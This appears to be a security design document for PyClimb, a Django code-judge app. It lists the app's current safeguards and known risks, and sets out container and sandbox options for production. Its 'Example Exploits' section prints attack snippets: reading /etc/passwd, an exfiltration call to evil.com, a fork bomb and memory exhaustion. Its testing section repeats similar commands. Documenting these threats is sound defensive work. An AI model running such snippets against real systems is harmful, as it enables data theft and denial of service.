# PyClimb Security Model

This document describes the current security posture of PyClimb's code execution system and what changes are required before public deployment.

## Current Status: MVP (Local Development Only)

**⚠️ WARNING: The current implementation is NOT suitable for untrusted public internet use.**

The judge executes arbitrary Python code on the host machine. While basic guardrails are in place, a determined attacker can escape them.

---

## Current Safeguards

| Safeguard | Implementation | Effectiveness |
|-----------|----------------|---------------|
| **Subprocess isolation** | Code runs in `subprocess.run()`, never `exec()` in Django | ✅ Good |
| **Time limit** | 2-second timeout via `subprocess.run(timeout=...)` | ✅ Good |
| **Output size limit** | stdout/stderr capped at 64KB | ✅ Good |
| **Code size limit** | Submissions capped at 50KB | ✅ Good |
| **Temp directory** | Each execution runs in isolated `tempfile.TemporaryDirectory` | ⚠️ Partial |
| **Minimal environment** | Only `PATH`, `HOME`, `TMPDIR` passed to subprocess | ⚠️ Partial |
| **Python isolated mode** | `-I` flag ignores `PYTHON*` env vars and user site-packages | ⚠️ Partial |
| **No bytecode** | `PYTHONDONTWRITEBYTECODE=1` prevents `.pyc` creation | ✅ Good |

---

## Known Risks (Current Implementation)

### 🔴 Critical

| Risk | Description | Mitigation Status |
|------|-------------|-------------------|
| **Filesystem read access** | Code can read any file the Django process can read | ❌ Not mitigated |
| **Filesystem write access** | Code can write outside temp directory | ❌ Not mitigated |
| **Network access** | Code can make outbound network connections | ❌ Not mitigated |
| **Process spawning** | Code can spawn additional processes | ❌ Not mitigated |
| **Resource exhaustion** | Fork bombs, memory exhaustion possible | ⚠️ Partially mitigated by timeout |

### 🟡 Moderate

| Risk | Description | Mitigation Status |
|------|-------------|-------------------|
| **Import abuse** | Code can import any installed Python package | ⚠️ Somewhat limited by `-I` flag |
| **Environment probing** | Code can inspect system via `os`, `sys`, `platform` | ❌ Not mitigated |
| **Timing attacks** | Code can measure execution time to probe system | ❌ Not mitigated |

### Example Exploits (For Awareness)

```python
# Read sensitive files
print(open('/etc/passwd').read())

# Write to filesystem
open('/tmp/evil.txt', 'w').write('pwned')

# Network access
import urllib.request
urllib.request.urlopen('https://evil.com/exfil?data=...')

# Fork bomb (will timeout, but wastes resources)
import os
while True: os.fork()

# Memory exhaustion
x = 'A' * (10 ** 10)
```

---

## Production Requirements

Before deploying PyClimb to the public internet, implement **at least one** of these isolation strategies:

### Option 1: Container-per-Submission (Recommended)

Run each submission in a disposable Docker container:

```
┌─────────────────────────────────────────────┐
│  Django Server                              │
│  ┌────────────────────────────────────────┐ │
│  │  Judge Service                         │ │
│  │  - Creates container per submission    │ │
│  │  - Mounts code as read-only volume     │ │
│  │  - Captures stdout/stderr              │ │
│  │  - Destroys container after execution  │ │
│  └────────────────────────────────────────┘ │
└─────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────┐
│  Disposable Container                       │
│  - No network (--network none)              │
│  - Read-only filesystem                     │
│  - Memory limit (--memory 128m)             │
│  - CPU limit (--cpus 0.5)                   │
│  - No privileged operations                 │
│  - Dropped capabilities                     │
└─────────────────────────────────────────────┘
```

**Docker run example:**
```bash
docker run --rm \
  --network none \
  --memory 128m \
  --cpus 0.5 \
  --read-only \
  --tmpfs /tmp:size=10m \
  --security-opt no-new-privileges \
  --cap-drop ALL \
  -v /path/to/code.py:/code.py:ro \
  python:3.11-slim \
  timeout 5 python /code.py < /dev/stdin
```

### Option 2: Dedicated Judge Server

Run the judge on a separate, isolated server:

```
┌──────────────┐         ┌──────────────────────┐
│ Django App   │  HTTPS  │ Judge Server         │
│ (Web-facing) │ ──────► │ (No internet egress) │
└──────────────┘         │ (Ephemeral VMs)      │
                         └──────────────────────┘
```

- Judge server has no access to Django database
- Judge server has no outbound internet
- Code runs in ephemeral VMs or containers
- Network isolated via firewall rules

### Option 3: Firejail/Bubblewrap Sandbox

Use Linux sandboxing tools for lighter-weight isolation:

```bash
firejail --private --net=none --rlimit-as=134217728 \
  python3 solution.py < input.txt
```

Or with bubblewrap:
```bash
bwrap --unshare-net --unshare-pid --die-with-parent \
  --ro-bind /usr /usr --ro-bind /lib /lib \
  --tmpfs /tmp --proc /proc \
  python3 solution.py
```

---

## Implementation Roadmap

### Phase 1: Current (MVP)
- [x] Subprocess execution
- [x] Time limits
- [x] Output limits
- [x] Temp directory isolation
- **Suitable for:** Local development, trusted users only

### Phase 2: Basic Hardening
- [ ] Add memory limits via `resource.setrlimit()` in subprocess
- [ ] Restrict imports via custom import hook
- [ ] Add seccomp filtering (Linux only)
- **Suitable for:** Private deployment with semi-trusted users

### Phase 3: Container Isolation
- [ ] Docker-per-submission execution
- [ ] Network isolation
- [ ] Filesystem isolation
- [ ] Resource limits via cgroups
- **Suitable for:** Public deployment

### Phase 4: Production Hardening
- [ ] Rate limiting per user/IP
- [ ] Queue system for fair scheduling (Celery/Redis)
- [ ] Monitoring and alerting
- [ ] Abuse detection
- **Suitable for:** Public internet at scale

---

## Testing Security

Before deploying, test these scenarios:

```bash
# Should be blocked in production:
python -c "import os; os.system('whoami')"
python -c "import socket; s=socket.socket(); s.connect(('8.8.8.8', 53))"
python -c "open('/etc/passwd').read()"
python -c "while True: pass"  # Should timeout
python -c "x = 'A' * 10**9"   # Should be killed for memory
```

---

## Incident Response

If you suspect a security breach:

1. **Stop the Django server immediately**
2. **Review recent submissions** for malicious code patterns
3. **Check system logs** for unauthorized access
4. **Rotate any credentials** that may have been exposed
5. **Audit the host** for persistence mechanisms

---

## Summary

| Deployment Scenario | Current Safety | Recommendation |
|---------------------|----------------|----------------|
| Local development (just you) | ✅ Acceptable | Use as-is |
| Private LAN (trusted users) | ⚠️ Risky | Add memory limits |
| Private internet (friends) | ⚠️ Risky | Add container isolation |
| Public internet | ❌ Unsafe | Full container isolation required |

**Bottom line:** The current implementation is fine for learning and local development. Do not expose to the public internet without container isolation.
